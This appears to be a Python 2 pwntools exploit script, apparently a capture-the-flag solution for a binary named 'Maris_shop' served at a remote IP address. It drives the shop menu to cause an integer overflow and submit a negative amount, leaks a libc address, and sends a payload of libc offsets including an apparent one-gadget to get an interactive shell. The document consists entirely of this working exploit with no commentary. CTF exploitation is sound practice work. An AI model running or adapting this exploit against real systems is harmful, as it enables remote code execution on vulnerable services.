from pwn import *

#r = process(["./Maris_shop"],env={"LD_PRELOAD":"./libc.so.6"})
r = remote("110.10.147.102", 7767 )
#r.interactive()
r.sendlineafter(":","1")
r.recvline()
price = int(r.recvline().split('-')[-1])
num = 0xffffd8f0/price
r.sendlineafter(":","1")
r.sendlineafter(":",str(num))
r.sendlineafter(":","4")
r.sendlineafter(":","1")
r.sendlineafter(":","0")

have = []
while len(have) < 16:
	r.sendlineafter(":","1")
	r.recvline()
	total = [ r.recvline().split(".")[-1] for _ in range(6)]

	for i in range(6):
		if total[i] not in have:
			have.append(total[i])
			r.sendlineafter(":",str(i+1))
			r.sendlineafter(":","1")
			break
		elif i==5:
			r.sendlineafter(":","7")
                        r.sendlineafter(":","1")


have[0] = ""
r.sendlineafter(":","4")
r.sendlineafter(":","1")
r.sendlineafter(":","0")
while len(have) < 17:
        r.sendlineafter(":","1")
        r.recvline()
        total = [ r.recvline().split(".")[-1] for _ in range(6)]

        for i in range(6):
                if total[i] not in have:
                        have.append(total[i])
                        r.sendlineafter(":",str(i+1))
                        r.sendlineafter(":","1")
                        break
                elif i==5:
                        r.sendlineafter(":","7")


r.sendlineafter(":","4")
r.sendlineafter(":","2")
r.sendlineafter(":","1")
have = [have[-1]]
while len(have) < 3:
        r.sendlineafter(":","1")
        r.recvline()
        total = [ r.recvline().split(".")[-1] for _ in range(6)]

        for i in range(6):
                if total[i] not in have:
                        have.append(total[i])
                        r.sendlineafter(":",str(i+1))
                        r.sendlineafter(":","1")
                        break
                elif i==5:
                        r.sendlineafter(":","7")

r.sendlineafter(":","4")
r.sendlineafter(":","1")
r.sendlineafter(":","0")

r.sendlineafter(":","3")
r.sendlineafter(":","1")
r.sendlineafter(":","15")

r.recvuntil("Amount:")
libc = int(r.recvline()) - 0x3c4b78
print hex(libc)

while len(have)<4:
	r.sendlineafter(":","1")
        r.recvline()
	total = [ r.recvline().split(".")[-1] for _ in range(6)]
        for i in range(6):
		if total[i] ==  have[1]:
                        have.append(total[i])
                        r.sendlineafter(":",str(i+1))
                        r.sendlineafter(":","-616")
                        break
                elif i==5:
                        r.sendlineafter(":","7")

have = have[:-1]
while len(have) < 4:
        r.sendlineafter(":","1")
        r.recvline()
        total = [ r.recvline().split(".")[-1] for _ in range(6)]

        for i in range(6):
                if total[i] not in have:
                        have.append(total[i])
                        r.sendlineafter(":",str(i+1))
                        r.sendlineafter(":","1")
                        break
                elif i==5:
                        r.sendlineafter(":","7")

context.arch = "amd64"
data =[libc+0x3c6790,0,libc+0xf02a4] + [0]*7 + [libc+0x3c4950]
payload = "\x00"*5+flat(data)

r.sendlineafter(":",payload)
r.interactive()


